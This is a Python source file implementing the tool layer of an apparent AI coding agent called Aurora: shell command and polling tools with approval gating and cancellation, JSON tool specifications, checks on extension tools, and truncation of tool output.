def run_command(command: str, cwd: str = "", background: bool = False,
                _cancel=None, **_) -> str:
    """Run a shell command, optionally in `cwd` (R90g) — otherwise the model
    has to prefix every call with its own `cd … && …` inside the shell
    string, which breaks as soon as a path needs quoting. `background=True`
    (R245) starts it detached and returns immediately with a job id for
    `check_command` — for anything expected to outlast one turn (a big
    download, a long build) instead of blocking the whole agent loop on it."""
    workdir = str(_resolve(cwd)) if cwd else None
    if workdir and not Path(workdir).is_dir():
        return f"[error: no such directory: {cwd}]"
    if background:
        job_id = _start_background(command, workdir)
        if job_id.startswith("[error:"):
            return job_id
        return (f"[background job {job_id} started]\n"
                f"check on it with check_command(job_id=\"{job_id}\")")
    try:
        out, code = _run_command_once(command, workdir, cancel=_cancel)
    except CommandCancelled as e:                                # R272
        return _cancelled_text(e)
    if code is None:
        head = f"[timeout after {COMMAND_TIMEOUT}s]"
        return f"{out}\n{head}" if out else head
    return (out.strip() or "[no output]") + (f"\n[exit {code}]" if code else "")


def wait_until(command: str, cwd: str = "", interval: float = 2.0,
              timeout: float = 60.0, then: str = "", _cancel=None,
              **_) -> str:
    """Repeatedly run `command` until it exits 0 or `timeout` seconds pass
    (R100) — a general "poll until true or give up" tool. Useful for "wait
    for the dev server to be listening", "wait until this file appears",
    etc. — instead of the model guessing a single sleep duration and hoping
    it was long enough.

    `then` (feature request, 2026-07-27): a second command run ONCE,
    immediately after `command` first succeeds, in the SAME gated call —
    "when the server is up, curl it" as one atomic step. Without this the
    model has to guess the boundary itself: a separate run_command call
    right after wait_until succeeds still races the exact thing wait_until
    was polling for (a listener that accepts the TCP connection a moment
    before it's actually ready to answer, a file that exists but isn't
    fully flushed yet) — this closes that race by running `then` in the
    same breath as the successful poll, with no round-trip back through the
    model in between.

    Approval is asked ONCE for the whole call — `agent.py`'s gate wraps the
    tool call itself, not each internal attempt, since re-approving every
    poll would make this unusable. Each attempt reuses `_run_command_once`
    directly (bypassing the approval gate, which already ran for this
    call), same execution as `run_command` — process-group-safe. Each
    attempt is capped to whatever's left of `timeout`, not the global
    `COMMAND_TIMEOUT` (R125b) — otherwise a single hung attempt could run
    up to COMMAND_TIMEOUT (300s default) even when the caller asked for a
    much smaller overall timeout. `then` gets its own COMMAND_TIMEOUT-bounded
    run, not carved out of the polling budget — it only ever runs once
    `command` has already succeeded, so it isn't racing the same clock."""
    import time as _time
    workdir = str(_resolve(cwd)) if cwd else None
    if workdir and not Path(workdir).is_dir():
        return f"[error: no such directory: {cwd}]"
    # bounded the same way COMMAND_TIMEOUT's default is — a wait tool must
    # not become an unbounded background job the agent loop can't see
    timeout = min(max(1.0, float(timeout or 60.0)), 300.0)
    interval = max(0.5, float(interval or 2.0))
    start = _time.monotonic()
    attempt = 0
    out, code = "", None
    while True:
        attempt += 1
        remaining = timeout - (_time.monotonic() - start)
        try:
            kw = {"cancel": _cancel} if _cancel is not None else {}
            out, code = _run_command_once(command, workdir,
                                          timeout=max(0.1, remaining), **kw)
        except CommandCancelled as e:                            # R272
            return _cancelled_text(e)
        shown = out.strip() or "[no output]"
        if code == 0:
            elapsed = _time.monotonic() - start
            head = (f"[wait_until: succeeded after {attempt} attempt(s), "
                    f"{elapsed:.1f}s]\n{shown}")
            if not then:
                return head
            try:
                then_out, then_code = _run_command_once(then, workdir, **kw)
            except CommandCancelled as e:                        # R272
                return f"{head}\n{_cancelled_text(e)}"
            then_shown = then_out.strip() or "[no output]"
            then_head = ("[then: timed out]" if then_code is None
                        else f"[then: exit {then_code}]")
            return f"{head}\n{then_head}\n{then_shown}"
        if _time.monotonic() - start + interval > timeout:
            status = "timed out mid-command" if code is None else f"exit {code}"
            return (f"[wait_until: gave up after {attempt} attempt(s), "
                    f"~{timeout:.0f}s ({status}) — last output:]\n{shown}")
        # R272: an interruptible sleep between attempts
        end = _time.monotonic() + interval
        while _time.monotonic() < end:
            if _cancel is not None and _cancel():
                return "[cancelled by user between wait_until attempts]"
            _time.sleep(min(_CANCEL_POLL_S, end - _time.monotonic()))


def _text(v) -> str:
    """TimeoutExpired's stdout/stderr are bytes even for a text-mode Popen."""
    if not v:
        return ""
    return v.decode("utf-8", errors="replace") if isinstance(v, bytes) else v


def _kill_group(proc, pgid=None) -> None:
    """SIGKILL the whole process group, falling back to the bare child. Best
    effort: the group may already be gone (race with a normal exit), and on a
    platform without process groups only the child can be reached."""
    import os
    import signal
    try:
        os.killpg(pgid if pgid is not None else os.getpgid(proc.pid),
                  signal.SIGKILL)
        return
    except (ProcessLookupError, PermissionError, OSError, AttributeError):
        pass
    try:
        proc.kill()
    except (ProcessLookupError, OSError):
        pass


RUNNERS = {
    "read_file": read_file, "list_dir": list_dir, "grep": grep,
    "find_files": find_files,
    "write_file": write_file, "edit_file": edit_file, "run_command": run_command,
    "apply_patch": apply_patch, "wait_until": wait_until,
    "check_command": check_command, "cancel_command": cancel_command,
}

SPEC = [
    {"name": "read_file",
     "description": "Read a UTF-8 text file, optionally a line range.",
     "parameters": {"type": "object", "properties": {
         "path": {"type": "string"},
         "offset": {"type": "integer",
                    "description": "1-based first line to read (optional)"},
         "limit": {"type": "integer",
                   "description": "how many lines to read from offset "
                                  "(optional)"}},
         "required": ["path"]}},
    {"name": "list_dir", "description": "List a directory's entries.",
     "parameters": {"type": "object", "properties": {
         "path": {"type": "string", "description": "default '.'"}}, "required": []}},
    {"name": "grep", "description": "Recursively search for an extended "
     "regex (ERE) or plain string; returns file:line matches.",
     "parameters": {"type": "object", "properties": {
         "pattern": {"type": "string"}, "path": {"type": "string"}},
         "required": ["pattern"]}},
    {"name": "find_files",
     "description": "Recursively search for files by GLOB pattern (e.g. "
                    "'*.py', 'test_*.md') — matches by filename, not "
                    "content; use `grep` to search inside files.",
     "parameters": {"type": "object", "properties": {
         "pattern": {"type": "string"},
         "path": {"type": "string", "description": "default '.'"}},
         "required": ["pattern"]}},
    {"name": "write_file", "description": "Create or overwrite a file with content (asks approval).",
     "parameters": {"type": "object", "properties": {
         "path": {"type": "string"}, "content": {"type": "string"}},
         "required": ["path", "content"]}},
    {"name": "edit_file", "description": "Replace one unique occurrence of `old` with `new` in a file (asks approval).",
     "parameters": {"type": "object", "properties": {
         "path": {"type": "string"}, "old": {"type": "string"}, "new": {"type": "string"},
         "replace_all": {"type": "boolean",
                         "description": "replace every occurrence instead of "
                                        "requiring a unique match (optional)"}},
         "required": ["path", "old", "new"]}},
    {"name": "run_command", "description": "Run a shell command (asks approval).",
     "parameters": {"type": "object", "properties": {
         "command": {"type": "string"},
         "cwd": {"type": "string",
                 "description": "directory to run it in (optional)"},
         "background": {"type": "boolean",
                        "description": "start it detached and return "
                                       "immediately with a job id instead "
                                       "of blocking until it exits — for "
                                       "anything expected to run longer "
                                       "than this turn (a big download, a "
                                       "long build); poll it with "
                                       "check_command (optional)"}},
         "required": ["command"]}},
    {"name": "apply_patch",
     "description": "Apply a unified diff (like `git diff`/`diff -u` output) "
                    "to a file — one call for several edits at once, instead "
                    "of one edit_file call per change. Each hunk's context "
                    "lines are matched by CONTENT, not the diff's line "
                    "numbers, so approximate line numbers are fine. All "
                    "hunks apply, or none do (asks approval).",
     "parameters": {"type": "object", "properties": {
         "path": {"type": "string"},
         "diff": {"type": "string",
                  "description": "unified diff hunks for this file — "
                                 "'@@ ... @@' headers followed by context "
                                 "(' '), removed ('-'), and added ('+') "
                                 "lines; --- / +++ file headers are optional "
                                 "and ignored (this `path` is authoritative)"}},
         "required": ["path", "diff"]}},
    {"name": "wait_until",
     "description": "Repeatedly run a shell command until it exits 0 or a "
                    "timeout passes (asks approval once, not per attempt). "
                    "Use for 'wait until the server is listening', 'wait "
                    "for the build to finish producing this file', etc. "
                    "instead of guessing a single sleep duration. Pass "
                    "`then` to run a second command once, immediately after "
                    "success, in this same call — e.g. wait for the server "
                    "to be listening, then curl it — instead of a separate "
                    "follow-up call that would re-race the same condition.",
     "parameters": {"type": "object", "properties": {
         "command": {"type": "string"},
         "cwd": {"type": "string", "description": "directory to run it in (optional)"},
         "interval": {"type": "number",
                     "description": "seconds between attempts (default 2)"},
         "timeout": {"type": "number",
                    "description": "give up after this many seconds "
                                   "(default 60, max 300)"},
         "then": {"type": "string",
                  "description": "a second command to run once, "
                                 "immediately after `command` first "
                                 "succeeds (optional)"}},
         "required": ["command"]}},
    {"name": "check_command",
     "description": "Poll a job started by run_command(..., "
                    "background=True) — its status and recent output. "
                    "With no job_id, lists every known background job. "
                    "Read-only, no approval needed.",
     "parameters": {"type": "object", "properties": {
         "job_id": {"type": "string",
                    "description": "id returned by run_command's "
                                   "background=True (optional — omit to "
                                   "list all jobs)"},
         "tail": {"type": "integer",
                  "description": "max characters of output to return, "
                                 "most-recent-first (default 4000)"}},
         "required": []}},
    {"name": "cancel_command",
     "description": "Kill a job started by run_command(..., "
                    "background=True) (asks approval). It keeps running "
                    "until this is called, a check_command call finding it "
                    "already exited, or the Aurora process itself exits.",
     "parameters": {"type": "object", "properties": {
         "job_id": {"type": "string",
                    "description": "id returned by run_command's "
                                   "background=True"}},
         "required": ["job_id"]}},
]


# R119: extension tools (user-authored ~/.aurora/extensions/ + Aurora's own
# bundled ones, e.g. MCP support) — populated once at Engine construction via
# set_extensions(), same pattern as TODO_ENABLED/PARALLEL_ENABLED above.
_EXTENSION_SPECS: list[dict] = []
_EXTENSION_RUNNERS: dict = {}


def set_extensions(specs: list[dict], runners: dict) -> list[str]:
    """Install extension tools, dropping any whose name collides with a
    builtin or an already-kept extension tool (R125c). Without this, a
    colliding name shipped silently broken two different ways: the spec
    still went to the model (duplicated in the tool list, or ambiguous
    between two extensions), but `run_tool`'s lookup order (RUNNERS before
    _EXTENSION_RUNNERS) meant a builtin-shadowing extension's runner was
    dead code the model could never actually reach, and `/extensions`
    hid the collision entirely since it only lists what made it into
    _EXTENSION_SPECS. Returns human-readable warnings for the same
    `engine.extension_warnings` surface load/register failures already use."""
    global _EXTENSION_SPECS, _EXTENSION_RUNNERS
    builtin_names = set(RUNNERS)
    warnings: list[str] = []
    seen: set[str] = set()
    kept_specs: list[dict] = []
    kept_runners: dict = {}
    for spec in specs:
        # R187d: shape-checked, because this runs UNGUARDED at engine.py's
        # construction — extensions.discover() wraps import and register(),
        # but not this merge. So `spec.get` on a non-dict (a bare `SPEC =
        # ["oops"]`) raised AttributeError straight out of Engine.__init__ and
        # Aurora would not start at all, with a raw traceback: one malformed
        # file in ~/.aurora/extensions/ bricking the session, against
        # extensions.py's stated "never lets one broken extension take the
        # rest of the session down".
        if not isinstance(spec, dict):
            warnings.append(f"extension tool spec isn't an object — skipped: "
                            f"{spec!r:.80}")
            continue
        name = spec.get("name")
        # A nameless spec used to be KEPT (None isn't in builtins or `seen`),
        # so it reached the model as an unnamed tool while `None in runners`
        # left it with no runner — a tool advertised and permanently
        # uncallable.
        if not isinstance(name, str) or not name.strip():
            warnings.append(f"extension tool spec has no usable name — "
                            f"skipped: {spec!r:.80}")
            continue
        if name in builtin_names:
            warnings.append(f"extension tool '{name}' shadows a builtin "
                            f"tool — skipped")
            continue
        if name in seen:
            warnings.append(f"extension tool '{name}' defined by more than "
                            f"one extension — skipped duplicate")
            continue
        # R238: a spec with no runner is the SAME defect the nameless-spec
        # branch above exists to stop — "advertised to the model and
        # permanently uncallable" — reached through a different door, and it
        # was kept silently. `run_tool` answers every such call with
        # `[error: unknown tool '<name>']`, so the model sees a tool it is
        # invited to use, calls it, fails, and can burn its whole iteration
        # budget retrying, with no warning anywhere to explain why.
        #
        # Entirely ordinary in a hand-written extension, which is the point
        # of the feature: a tool renamed in SPEC but not in RUNNERS, or a
        # typo in a RUNNERS key. `discover()` merges a module's static
        # SPEC/RUNNERS with whatever `register()` returns before calling
        # this, so a spec declared statically and its runner supplied by
        # `register()` still arrive here together — requiring the pair costs
        # no legitimate arrangement.
        if name not in runners:
            warnings.append(f"extension tool '{name}' has a spec but no "
                            f"runner — skipped (it would be advertised to "
                            f"the model and fail every call)")
            continue
        seen.add(name)
        kept_specs.append(spec)
        kept_runners[name] = runners[name]
    _EXTENSION_SPECS = kept_specs
    _EXTENSION_RUNNERS = kept_runners
    return warnings


def specs() -> list[dict]:
    """R157: no `include_web` argument any more. web_search/web_fetch moved to
    `extensions_bundled/web_extension.py`, whose `register()` reads
    `runtime.web_search` itself — so the flag is honoured once, at load, and
    this layer no longer knows the web tools exist by name."""
    s = list(SPEC)
    s += _EXTENSION_SPECS
    return s


# Hard cap on what a single tool result feeds the model. 200KB of grep/file
# output is ~50k tokens — one call could evict the whole conversation on a
# 65k local context. ~15k tokens is plenty; the model can re-read narrower.
TOOL_OUTPUT_LIMIT = 60_000

# R133b: every failure path in this module answers with a bracketed marker at
# the START of the output ("[error: …]", "[grep error: …]", "[tool error: …]")
# and every not-run path with "[skipped: …]", "[denied …]" or "[not run — …]".
# That convention was already load-bearing (the model reads it); this just
# names it so the session log can record an outcome instead of readers
# re-deriving it by sniffing strings.
_ERROR_MARKERS = ("[error:", "[tool error:", "[grep error:")
_SKIPPED_MARKERS = ("[skipped:", "[denied", "[not run")


def result_status(out: str) -> str:
    """'ok' | 'error' | 'skipped' for one tool result.

    R134g: the marker has to BRACKET the whole result, not merely start it.
    Every string this module (and the agent) produces for a failure or a
    refusal is a single bracketed form and nothing else, so the closing `]`
    is always the last character — including after `run_tool`'s truncation
    notice, which ends in one too. Reading a file whose FIRST line happens
    to be `[error: …]` — an application log, say — was otherwise reported as
    a failed tool call.

    Residual ambiguity is irreducible from the outside: a file that both
    starts with a marker and ends with `]` still reads as an error. Only the
    producer can be certain, and it does not say."""
    if not out.rstrip().endswith("]"):
        return "ok"
    head = out[:32]
    if head.startswith(_SKIPPED_MARKERS):
        return "skipped"
    if head.startswith(_ERROR_MARKERS):
        return "error"
    return "ok"


# R272: builtins that honour the turn's cancel callback while they block.
_CANCELLABLE = {"run_command", "wait_until", "find_files"}   # R292


def run_tool(name: str, args: dict, cancel=None) -> str:
    for table in (RUNNERS, _EXTENSION_RUNNERS):
        if name in table:
            try:
                if cancel is not None and table is RUNNERS \
                        and name in _CANCELLABLE:
                    out = table[name](**args, _cancel=cancel)
                else:
                    out = table[name](**args)
                # R144b: inside the guard. An extension's runner (user-authored,
                # and `extensions.py` never states str as a hard contract) that
                # returns None/dict/int made `len(out)` below raise TypeError
                # OUTSIDE the try — killing the turn in exactly the way the
                # comment below says must never happen.
                if not isinstance(out, str):
                    out = "" if out is None else str(out)
            except Exception as e:
                # a raising tool must NOT kill the turn: the assistant message
                # already carries the tool_use, and a missing tool result makes
                # every later request invalid (roles/tool_result pairing) —
                # feed the failure back as the result instead
                return (f"[tool error: {name}: "
                        f"{e.__class__.__name__}: {e}]")
            if len(out) > TOOL_OUTPUT_LIMIT:
                out = (out[:TOOL_OUTPUT_LIMIT]
                       + f"\n[output truncated at {TOOL_OUTPUT_LIMIT} chars "
                         f"({len(out)} total) — narrow the query/read a "
                         f"specific range]")
            return out
    return f"[error: unknown tool '{name}']"


def run_tools_parallel(calls: list, cancel=None) -> dict[int, str]:
    """Run several PARALLEL_SAFE calls at once (R94). `calls` is a list of
    (index, name, args); returns {index: output}. Every tool here only reads
    the filesystem or the network, and `run_tool` already swallows every
    exception into a `[tool error: …]` string, so a worker can neither raise
    nor corrupt shared state. The CALLER still processes results in the
    original order — approvals, secret challenges and the transcript stay
    strictly sequential, only the waiting overlaps."""
    from concurrent.futures import ThreadPoolExecutor
    def _run(n, a):
        return run_tool(n, a, cancel=cancel) if cancel is not None else run_tool(n, a)
    if len(calls) < 2:
        return {i: _run(n, a) for i, n, a in calls}
    with ThreadPoolExecutor(max_workers=min(len(calls), MAX_PARALLEL)) as pool:
        # R302: the turn's cancel reaches batched calls too (R292's
        # cancellable find_files was uncancellable inside a batch).
        futures = {i: pool.submit(_run, n, a) for i, n, a in calls}
        return {i: f.result() for i, f in futures.items()}
